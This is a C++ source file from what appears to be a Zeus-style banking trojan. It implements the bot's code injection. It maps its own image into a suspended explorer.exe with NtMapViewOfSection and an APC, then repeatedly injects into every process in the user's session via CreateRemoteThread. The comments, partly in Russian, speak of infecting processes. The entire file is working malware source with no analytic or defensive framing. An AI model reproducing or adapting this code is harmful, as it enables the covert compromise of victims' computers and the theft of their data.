#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <ShlObj.h>

#include "defines.h"
#include "core.h"
#include "coreinject.h"
#include "cryptedstrings.h"
#include "..\common\str.h"
#include "..\common\fs.h"
#include "..\common\sync.h"


#include "..\common\debug.h"
#include "..\common\process.h"
#include "..\common\baseoverlay.h"


/*
  Перменная в которую билдер сохзраняет базоовые данные для бота.
  Данная переменная должны находиться в произволбном cpp-файле, для обеспечения рандомизации ее
  адреса.
*/
extern const char baseConfigSource[sizeof(BASECONFIG)] = {'B', 'A', 'S', 'E', 'C', 'O', 'N', 'F', 'I', 'G'};
extern const char installDataSource[BaseOverlay::FULL_SIZE_OF_OVERLAY] = {'B', 'A', 'S', 'E', 'O', 'V', 'E', 'R', 'L', 'A', 'Y'};

DWORD WINAPI msg(void*)
{
	if(Core::init(Core::INITF_INJECT_START | Core::INITF_EXPLORER_FIRST))
		CoreInject::_injectToAll();
	//Core::_injectEntryForThreadEntry(0);

	ExitProcess(0);
	return 0;
}


static bool copyDataToBuffer(void *image, void *curVa, void *data, DWORD dataSize)
{
  DWORD_PTR rva = (DWORD_PTR)(((LPBYTE)curVa) - ((LPBYTE)coreData.modules.current));
  Mem::_copy((LPBYTE)image + rva, data, dataSize);
	return true;
}

static bool copyHandleToBuffer(HANDLE process, void *image, void *curVa, HANDLE handle)
{
  HANDLE newHandle;
  DWORD_PTR rva = (DWORD_PTR)(((LPBYTE)curVa) - ((LPBYTE)coreData.modules.current));
  
  if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, handle, process, &newHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) != FALSE)
  {
    //if(CWA(kernel32, WriteProcessMemory)(process, (LPBYTE)image + rva, &newHandle, sizeof(HANDLE), NULL) != FALSE)return true;
    Mem::_copy((LPBYTE)image + rva, &newHandle, sizeof(HANDLE));
	return true;
	//CWA(kernel32, DuplicateHandle)(process, newHandle, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
  }
  return false;
}

void* CoreInject::_copyModuleToExplorer(void *image)
{
#if defined _WIN64
  PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
#else
  PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
#endif
  typedef NTSTATUS (WINAPI *tNtMapViewOfSection)(HANDLE,HANDLE,LPVOID,ULONG,SIZE_T,LARGE_INTEGER*,SIZE_T*,DWORD,ULONG,ULONG);
  typedef NTSTATUS (WINAPI *tNtQueueApcThread)(HANDLE,PIO_APC_ROUTINE,PVOID,PIO_STATUS_BLOCK,ULONG);

  CSTR_GETA(ntmapviewofsection,ntdll_ntmapviewofsection);
  CSTR_GETA(ntqueueapcthread,ntdll_ntqueueapcthread);
  CSTR_GETW(slashexplorerdotexe, explorer_exe);

  tNtMapViewOfSection NtMapViewOfSection=(tNtMapViewOfSection)Core::__GetProcAddress(coreData.modules.ntdll,ntmapviewofsection);
  tNtQueueApcThread NtQueueApcThread=(tNtQueueApcThread)Core::__GetProcAddress(coreData.modules.ntdll,ntqueueapcthread);
  WCHAR path[MAX_PATH];
  if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_WINDOWS, NULL, SHGFP_TYPE_CURRENT, path) == S_OK) Str::_catW(path, slashexplorerdotexe, CryptedStrings::len_explorer_exe - 1);
  WDEBUG1(WDDT_INFO, "EXPLORER.EXE PATH: %s", path);
  DWORD imageSize = ntHeader->OptionalHeader.SizeOfImage;
  bool ok         = false;
  DWORD viewSize = imageSize;
  void* remoteMem = 0;

  if(CWA(kernel32, IsBadReadPtr)(coreData.modules.current, imageSize) != 0)return NULL;
  
  //Выделние памяти для модуля.
 
  STARTUPINFOW st; PROCESS_INFORMATION pi;
  Mem::_zero(&st, sizeof(STARTUPINFOW));Mem::_zero(&pi, sizeof(PROCESS_INFORMATION));
  if(CWA(kernel32,CreateProcessW)(path,0,0,0,0,CREATE_SUSPENDED,0,0,&st,&pi) == false) {WDEBUG0(WDDT_ERROR, "Cant create explorer.exe");return NULL;}
  HANDLE hFile=CWA(kernel32,CreateFileMapping)(INVALID_HANDLE_VALUE,NULL, PAGE_EXECUTE_READWRITE,0,imageSize,NULL);
  
  if(!NT_SUCCESS(NtMapViewOfSection(hFile, pi.hProcess, &remoteMem, 0,0,0,&viewSize,1,0,PAGE_EXECUTE_READWRITE) != 0)) {WDEBUG0(WDDT_ERROR, "Cannot map into new process1");return NULL;}
  
  CWA(kernel32,TerminateProcess)(pi.hProcess,0);
  Mem::_zero(&st, sizeof(STARTUPINFOW));Mem::_zero(&pi, sizeof(PROCESS_INFORMATION));
  if(CWA(kernel32,CreateProcessW)(path,0,0,0,0,CREATE_SUSPENDED,0,0,&st,&pi) == false) {WDEBUG0(WDDT_ERROR, "Cant create explorer.exe");return NULL;}

  //Verjacrinq, uxxum enq koder@ u bacum noric
  if(remoteMem != NULL)
  {
    //Создаем локальный буфер, в котором будем вносить измненеия.
	LPBYTE buf=(LPBYTE)CWA(kernel32,MapViewOfFile)(hFile,FILE_MAP_ALL_ACCESS,0,0,0);
	if(buf <= 0) {WDEBUG0(WDDT_ERROR, "buf is null!");return NULL;}
	Mem::_copy(buf, image, imageSize);
    if(buf != NULL)
    {
      //Изменяем релоки.
      IMAGE_DATA_DIRECTORY *relocsDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
      
      if(relocsDir->Size > 0 && relocsDir->VirtualAddress > 0)
      {
        DWORD_PTR delta               = (DWORD_PTR)((LPBYTE)remoteMem - ntHeader->OptionalHeader.ImageBase);
        DWORD_PTR oldDelta            = (DWORD_PTR)((LPBYTE)image - ntHeader->OptionalHeader.ImageBase);
        IMAGE_BASE_RELOCATION *relHdr = (IMAGE_BASE_RELOCATION *)(buf + relocsDir->VirtualAddress);
      
        while(relHdr->VirtualAddress != 0)
        {
          if(relHdr->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))//FIXME: Что это?
          {
            DWORD relCount = (relHdr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            LPWORD relList = (LPWORD)((LPBYTE)relHdr + sizeof(IMAGE_BASE_RELOCATION));
            
            for(DWORD i = 0; i < relCount; i++)if(relList[i] > 0)
            {
              DWORD_PTR *p = (DWORD_PTR *)(buf + (relHdr->VirtualAddress + (0x0FFF & (relList[i]))));
              *p -= oldDelta;
              *p += delta;
            }
          }
          
          relHdr = (IMAGE_BASE_RELOCATION *)((LPBYTE)relHdr + relHdr->SizeOfBlock);
        }


        //Копируем образ в процесс.
        //ok = CWA(kernel32, WriteProcessMemory)(process, remoteMem, buf, imageSize, NULL) ? true : false;
		
		{
		

			//Указываем текущий модуль.
			if(!copyDataToBuffer(buf, &coreData.modules.current, &remoteMem, sizeof(HMODULE)))
			{
			WDEBUG0(WDDT_ERROR, "Failed coreData.modules.current.");
			
			}
			{
				HANDLE processMutex = Core::createMutexOfProcess(pi.dwProcessId);
				HANDLE newMutex;
				if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, processMutex, pi.hProcess, &newMutex, 0, FALSE, DUPLICATE_SAME_ACCESS) == FALSE)
				{
					WDEBUG0(WDDT_ERROR, "Failed to duplicate mutex of process.");
				}
			}
			DWORD proccessFlags = 0;
			proccessFlags |= (coreData.proccessFlags & Core::CDPT_INHERITABLE_MASK);
			if(!copyDataToBuffer(buf, &coreData.proccessFlags, &proccessFlags, sizeof(DWORD)))
			{
			  WDEBUG0(WDDT_ERROR, "Failed coreData.proccessFlags.");
			}

			  //coreData.globalHandles.stopEvent.
			if(!copyHandleToBuffer(pi.hProcess, buf, &coreData.globalHandles.stopEvent, coreData.globalHandles.stopEvent))
			{
				WDEBUG0(WDDT_ERROR, "Failed coreData.globalHandles.stopEvent.");
			}

			//coreData.globalHandles.stopedEvent.
			if(!copyHandleToBuffer(pi.hProcess, buf, &coreData.globalHandles.stopedEvent, coreData.globalHandles.stopedEvent))
			{
				WDEBUG0(WDDT_ERROR, "Failed coreData.globalHandles.stopedEvent.");
			}

		}

		if(!NT_SUCCESS(NtMapViewOfSection(hFile, pi.hProcess, &remoteMem, 0,0,0,&viewSize,1,0,PAGE_EXECUTE_READWRITE) != 0)) {WDEBUG0(WDDT_ERROR, "Cannot map into new process");return NULL;}
		if(!NT_SUCCESS(NtQueueApcThread(pi.hThread, (PIO_APC_ROUTINE)((LPBYTE)msg - (LPBYTE)coreData.modules.current + (LPBYTE)remoteMem), 0 ,0,0))){WDEBUG0(WDDT_ERROR, "NtQueueApcThread error"); CWA(kernel32,TerminateProcess)(pi.hProcess,0);};
		CWA(kernel32,ResumeThread)(pi.hThread);
		CWA(kernel32,CloseHandle)(pi.hThread);
		CWA(kernel32,CloseHandle)(pi.hProcess);

	  }
      
      CWA(kernel32,UnmapViewOfFile)(buf);
	  CWA(kernel32,CloseHandle)(hFile);
    }
    
    if(!ok)
    {
      remoteMem = NULL;
    }
  }

  return remoteMem;
}

/*
  Инжектирование кода в конкретный процесс.

  IN pid           - ID процесса.
  IN processMutex  - мютекс процесса.
  IN proccessFlags - данные для нового coreData.proccessFlags, текщие данные наследуются по маске
                     Core::CDPT_INHERITABLE_MASK.

  Return           - true - в случаи успеха,
                     false - в случаи ошибки.
*/
static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
{
  bool ok = false;

  HANDLE process = CWA(kernel32, OpenProcess)(PROCESS_QUERY_INFORMATION |
                                              PROCESS_VM_OPERATION |
                                              PROCESS_VM_WRITE |
                                              PROCESS_VM_READ |
                                              PROCESS_CREATE_THREAD |
                                              PROCESS_DUP_HANDLE,
                                              FALSE, pid);

  if(process != NULL)
  {
    void *newImage = Core::initNewModule(process, processMutex, proccessFlags);
    if(newImage != NULL)
    {
      LPTHREAD_START_ROUTINE proc = (LPTHREAD_START_ROUTINE)((LPBYTE)newImage + (DWORD_PTR)((LPBYTE)Core::_injectEntryForThreadEntry - (LPBYTE)coreData.modules.current));
	  
	  HANDLE thread = CWA(kernel32, CreateRemoteThread)(process, NULL, 0, proc, NULL, 0, NULL);

      if(thread != NULL)
      {
	#   if(BO_DEBUG > 0)
        WDEBUG2(WDDT_INFO, "newImage=0x%p, thread=0x%08X", thread, proc);
	#endif
        if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
        {
			#   if(BO_DEBUG > 0)
          WDEBUG2(WDDT_WARNING, "Failed to wait for thread end, newImage=0x%p, thread=0x%08X", newImage, thread);
			#endif	
        }
        CWA(kernel32, CloseHandle)(thread);
        ok = true;
      }
      else
      {
		#   if(BO_DEBUG > 0)
        WDEBUG1(WDDT_ERROR, "Fucked up with id=%u.", pid);
		#endif
        CWA(kernel32, VirtualFreeEx)(process, newImage, 0, MEM_RELEASE);
      }
    }
#   if(BO_DEBUG > 0)
    else WDEBUG1(WDDT_ERROR, "Failed to alloc code in process with id=%u.", pid);
#   endif

    CWA(kernel32, CloseHandle)(process);
  }
#if(BO_DEBUG > 0)
  else WDEBUG1(WDDT_ERROR, "Failed to open process with id=%u.", pid);
#endif

  return ok;
}

static bool InjectMalware(void)
{
}

void CoreInject::init(void)
{

}

void CoreInject::uninit(void)
{

}

bool CoreInject::_injectToAll(void)
{
  bool ok = false;
  #   if(BO_DEBUG > 0)
  WDEBUG0(WDDT_INFO, "Listing processes...");  
	#endif
  //Ишим процессы до тех пор, пока не остнется не зараженных.
  LPDWORD injectedPids    = NULL;
  DWORD injectedPidsCount = 0;
  DWORD newProcesses;

  do
  {
    HANDLE snap = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);  
    newProcesses = 0;

    if(snap != INVALID_HANDLE_VALUE)
    {
      PROCESSENTRY32W pe;
      pe.dwSize = sizeof(PROCESSENTRY32W);

      if(CWA(kernel32, Process32FirstW)(snap, &pe))do
      {
        if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid)
        {
          TOKEN_USER *tu;
          DWORD sessionId;
          DWORD sidLength;

          //Проверям сушетвует ли ID уже в списке.
          for(DWORD i = 0; i < injectedPidsCount; i++)if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT;

          HANDLE mutexOfProcess = Core::createMutexOfProcess(pe.th32ProcessID);
          if(mutexOfProcess == NULL)goto SKIP_INJECT;

          //Получаем SID процесса и сравниваем его с SID текшего процесса.
          if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)
          {
            //WDEBUG2(WDDT_INFO, "sessionId=\"%u\", coreData.currentUser.id=\"%u\"", sessionId, coreData.currentUser.id);
            if(sessionId == coreData.currentUser.sessionId &&
               (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
               Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)
            {
              //SID'ы равны.
              if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
              {
                injectedPids[injectedPidsCount++] = pe.th32ProcessID;
                newProcesses++;
				#   if(BO_DEBUG > 0)
                WDEBUG1(WDDT_INFO, "pe.th32ProcessID=%u", pe.th32ProcessID);
				#endif
				
				if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0))ok = true;
              }
#             if(BO_DEBUG > 0)
              else WDEBUG0(WDDT_ERROR, "Failed to realloc injectedPids.");
#             endif
            }
            Mem::free(tu);
          }

          CWA(kernel32, CloseHandle)(mutexOfProcess);

SKIP_INJECT:;
        }
      }
      while(CWA(kernel32, Process32NextW)(snap, &pe));

      CWA(kernel32, CloseHandle)(snap);
    }
#   if(BO_DEBUG > 0)
    else WDEBUG0(WDDT_ERROR, "Failed to list processes.");
#   endif
  }
  while(newProcesses != 0);

  Mem::free(injectedPids);

  return ok;
}

